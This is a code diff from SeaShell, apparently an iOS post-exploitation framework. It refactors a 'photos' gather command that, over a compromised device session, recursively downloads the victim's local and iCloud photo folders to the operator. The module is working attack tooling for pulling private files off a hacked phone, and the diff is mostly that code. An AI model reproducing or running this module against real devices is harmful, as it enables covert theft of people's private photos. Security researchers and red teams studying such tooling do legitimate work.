@@ -5,19 +5,17 @@ Current source: https://github.com/EntySec/SeaShell
 
 import os
 
+from pex.string import String
+
 from pwny.api import *
 from pwny.types import *
 
-from pex.string import String
-
-from hatsploit.lib.command import Command
+from badges.cmd import Command
 
 
-class HatSploitCommand(Command):
+class ExternalCommand(Command, String):
     def __init__(self):
-        super().__init__()
-
-        self.details = {
+        super().__init__({
             'Category': "gather",
             'Name': "photos",
             'Authors': [
@@ -26,9 +24,7 @@ class HatSploitCommand(Command):
             'Description': "Download photos available on device or iCloud.",
             'Usage': "photos [local|icloud] <local_path>",
             'MinArgs': 2
-        }
-
-        self.string = String()
+        })
 
     def recursive_walk(self, remote_path, local_path):
         result = self.session.send_command(
@@ -46,11 +42,11 @@ class HatSploitCommand(Command):
 
             while file:
                 try:
-                    hash = self.string.bytes_to_stat(file.get_raw(TLV_TYPE_BYTES))
+                    hash = self.bytes_to_stat(file.get_raw(TLV_TYPE_BYTES))
                 except Exception:
                     hash = {}
 
-                file_type = self.string.mode_type(hash.get('st_mode', 0))
+                file_type = self.mode_type(hash.get('st_mode', 0))
                 path = file.get_string(TLV_TYPE_PATH)
 
                 if file_type == 'file':
@@ -63,8 +59,8 @@ class HatSploitCommand(Command):
 
                 file = result.get_tlv(TLV_TYPE_GROUP)
 
-    def run(self, argc, argv):
-        if argv[1] == 'icloud':
+    def run(self, args):
+        if args[1] == 'icloud':
             path = '/var/mobile/Media/PhotoData/CPLAssets'
         else:
             path = '/var/mobile/Media/DCIM'
@@ -80,4 +76,4 @@ class HatSploitCommand(Command):
             self.print_error(f"Photos can't be located!")
             return
 
-        self.recursive_walk(path, argv[2])
+        self.recursive_walk(path, args[2])
